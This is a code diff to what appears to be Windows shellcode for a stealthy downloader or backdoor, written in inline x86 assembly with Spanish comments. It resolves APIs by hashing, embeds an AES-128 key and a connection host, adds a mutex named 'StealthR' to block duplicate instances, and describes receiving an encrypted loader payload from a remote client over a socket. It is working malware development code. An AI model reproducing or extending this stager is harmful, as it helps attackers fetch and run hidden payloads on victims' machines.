@@ -104,6 +104,7 @@ advapi32_symbol_hashes:
         VAR_DEFINE(buffLen)
 #pragma endregion
         CALC_STACKSIZE()
+//¡¡¡¡CONSTANTES TEMPORALES!!!!
 KEY:   	//typedef struct aes128Blob{
             //BLOBHEADER{
                 /*bType*/       EMIT_BYTE(PLAINTEXTKEYBLOB)
@@ -115,6 +116,7 @@ KEY:   	//typedef struct aes128Blob{
             /*keydata[16]*/     EMIT_BYTE_ARRAY( (0x63) (0x08) (0x5B) (0x66) (0xDB) (0xD6) (0x33) (0x31) (0xF3) (0x80) (0xD9) (0x75) (0x59) (0xEC) (0x38) (0x04))	
         //}
 HOST:   EMIT_BYTE_ARRAY(('1') ('2') ('7') ('.') ('0') ('.') ('0') ('.') ('1')(0))
+MUTEX:  EMIT_BYTE_ARRAY(('S') ('t') ('e') ('a') ('l') ('t') ('h') ('R')(0))
 #pragma endregion
     __asm{
 #ifdef ERR_CHECK
@@ -157,8 +159,9 @@ start:
         mov  [ebp+_pKEY], esi
         lea  ebx, [esi+28]
         mov  [ebp+_pHOST], ebx
-/*
+
 #pragma region CRYPT_DATA
+/*
         #define BLOCK_SIZE 38
         sub  esp, (40)                  //<<<<PARCHEAR EN EL BUILDER
         #ifdef SC_DELTA
@@ -187,8 +190,8 @@ Redo:
         #ifdef SC_DELTA
         mov edi, eax                    //Restauramos el Delta Offset
         #endif
-#pragma endregion
 */
+#pragma endregion
 
         /*###############################################################################
         ** Carga de APIs:
@@ -211,13 +214,13 @@ next_module:
         jne  next_module
 find_kernel32_finished:
 
-        movr(ecx, LoadFunctions)
-        movr(esi, kernel32_symbol_hashes)//v Puntero al primer hash
+        movr(ecx, LoadFunctions)        // Puntero a LoadFunctions()
+        movr(esi, kernel32_symbol_hashes)// Puntero al primer hash
 
         //Cargamos las apis de kernel32 en la pila a partir de los hashes
         push kernel32_count             //v Número de hashes de kernel32
         call ecx                        //>LoadFunctions(kernel32_count);
-        mov  ebx, [ebp-(kernel32_count*4)]//EBX = &LoadLibraryA
+        mov  ebx, [ebp-(kernel32_count*4)+_LoadLibraryA]//EBX = &LoadLibraryA
 
         push ecx
         //Obtenemos la BaseAddress de ws2_32
@@ -235,26 +238,26 @@ find_kernel32_finished:
 
         //Obtenemos el BaseAddress de advapi32
         cdq                             //EDX = 0
-        push ecx
+        push ecx                        //Guardamos ECX (LoadFunctions()) en el Stack
         push edx                        //v
         pushc('23ip')                   //v Metemos el nombre del API en el stack (ANSI)
         pushc('avda')                   //v
         push esp                        //v
         call ebx                        //>LoadLibraryA("advapi32");
         add  esp, 0xC                   //Restauramos la pila eliminando la cadena ANSI
-        pop  ecx
+        pop  ecx                        //Recuperamos el puntero a LoadFunctions()
 
         push advapi32_count             //v Número de hashes de advapi32
         call ecx                        //>LoadFunctions(advapi32_count);
 
         //Volvemos a apuntar al inicio del stack de APIs
-        sub  ebp, (kernel32_count + ws2_32_count + advapi32_count)*4
+        sub  ebp, STACKSIZE - 0xC
 
-        push [ebp+_pHOST]               //v
         cdq                             //EDX = 0
+        pushr(MUTEX)                    //v
         push edx                        //v
         push edx                        //v
-        call [ebp+_CreateMutexA]        //> CreateMutexA(NULL, False, &HOST)
+        call [ebp+_CreateMutexA]        //> CreateMutexA(NULL, False, &MUTEX)
         cdq                             //EDX = 0
         mov  edx, DWORD PTR FS:[edx+0x18]//v
         mov  eax, [edx+0x34]            //> GetLastError()
@@ -373,7 +376,7 @@ connected:
         ** Recepción de datos desde el cliente:
         **  Una vez establecida la conexión con éxito intentamos recibir 
         **  el paquete inicial compuesto de:
-        **      IV+SizePayload+checksum+LOADER_IAT+CARGADOR
+        **      IV+checksum+SizePayload+LOADER_IAT+CARGADOR
         **  Siendo cada uno:
         **      *IV(16bytes)    : Vector de inicializacion para el cifrado
         **{{
